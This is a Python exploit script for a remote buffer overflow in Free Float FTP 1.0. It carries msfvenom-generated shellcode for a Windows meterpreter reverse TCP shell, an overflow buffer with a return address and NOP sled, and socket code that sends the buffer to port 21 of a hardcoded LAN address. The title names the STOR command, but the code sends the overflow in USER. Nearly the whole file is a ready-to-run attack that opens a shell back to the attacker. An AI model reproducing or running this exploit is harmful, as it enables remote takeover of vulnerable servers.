#!/#!/usr/bin/python
import socket

#Exploit Title: Free Float FTP 1.0 "STOR" Remote Buffer Overflow

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=your ip LPORT=4444 -b '\x00\x0A\x0D' -f rb

# Exploit Author: cyber_homeless
shell = (
"\xda\xd8\xbb\xb0\xde\xb8\x3b\xd9\x74\x24\xf4\x5a\x2b\xc9" +
"\xb1\x56\x31\x5a\x18\x03\x5a\x18\x83\xc2\xb4\x3c\x4d\xc7" +
"\x5c\x42\xae\x38\x9c\x23\x26\xdd\xad\x63\x5c\x95\x9d\x53" +
"\x16\xfb\x11\x1f\x7a\xe8\xa2\x6d\x53\x1f\x03\xdb\x85\x2e" +
"\x94\x70\xf5\x31\x16\x8b\x2a\x92\x27\x44\x3f\xd3\x60\xb9" +
"\xb2\x81\x39\xb5\x61\x36\x4e\x83\xb9\xbd\x1c\x05\xba\x22" +
"\xd4\x24\xeb\xf4\x6f\x7f\x2b\xf6\xbc\x0b\x62\xe0\xa1\x36" +
"\x3c\x9b\x11\xcc\xbf\x4d\x68\x2d\x13\xb0\x45\xdc\x6d\xf4" +
"\x61\x3f\x18\x0c\x92\xc2\x1b\xcb\xe9\x18\xa9\xc8\x49\xea" +
"\x09\x35\x68\x3f\xcf\xbe\x66\xf4\x9b\x99\x6a\x0b\x4f\x92" +
"\x96\x80\x6e\x75\x1f\xd2\x54\x51\x44\x80\xf5\xc0\x20\x67" +
"\x09\x12\x8b\xd8\xaf\x58\x21\x0c\xc2\x02\x2d\xe1\xef\xbc" +
"\xad\x6d\x67\xce\x9f\x32\xd3\x58\x93\xbb\xfd\x9f\xa2\xac" +
"\xfd\x70\x0c\xbc\x03\x71\x6c\x94\xc7\x25\x3c\x8e\xee\x45" +
"\xd7\x4e\x0e\x90\x4d\x45\x98\xdb\x39\x58\x4e\xb4\x3b\x5b" +
"\x4d\x6e\xb2\xbd\xc1\x3e\x94\x11\xa2\xee\x54\xc2\x4a\xe5" +
"\x5b\x3d\x6a\x06\xb6\x56\x01\xe9\x6e\x0e\xbe\x90\x2b\xc4" +
"\x5f\x5c\xe6\xa0\x60\xd6\x02\x54\x2e\x1f\x67\x46\x47\x78" +
"\x87\x96\x98\xed\x87\xfc\x9c\xa7\xd0\x68\x9f\x9e\x16\x37" +
"\x60\xf5\x25\x30\x9e\x88\x1f\x4a\xa9\x1e\x1f\x24\xd6\xce" +
"\x9f\xb4\x80\x84\x9f\xdc\x74\xfd\xcc\xf9\x7a\x28\x61\x52" +
"\xef\xd3\xd3\x06\xb8\xbb\xd9\x71\x8e\x63\x22\x54\x8c\x64" +
"\xdc\x2a\xbb\xcc\xb4\xd4\xfb\xec\x44\xbf\xfb\xbc\x2c\x34" +
"\xd3\x33\x9c\xb5\xfe\x1b\xb4\x3c\x6f\xe9\x25\x40\xba\xaf" +
"\xfb\x41\x49\x74\x0c\x3b\x22\x8b\xed\xbc\x2a\xe8\xee\xbc" +
"\x52\x0e\xd3\x6a\x6b\x64\x12\xaf\xc8\x77\x21\x92\x79\x12" +
"\x49\x80\x7a\x37")



buff = "A" * 247 + "\x90\xE2\x7C\x76" + "\x90" * 20 + shell  #\x53\x93\x37\x7E
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.1.19', 21)) #you know what to do here
	data = s.recv(1024)
	print(data)
	s.send('USER' + buff + '\r\n')
	data = s.recv(1024)
	print(data)
except socket.error:
	print("the connection deid....")
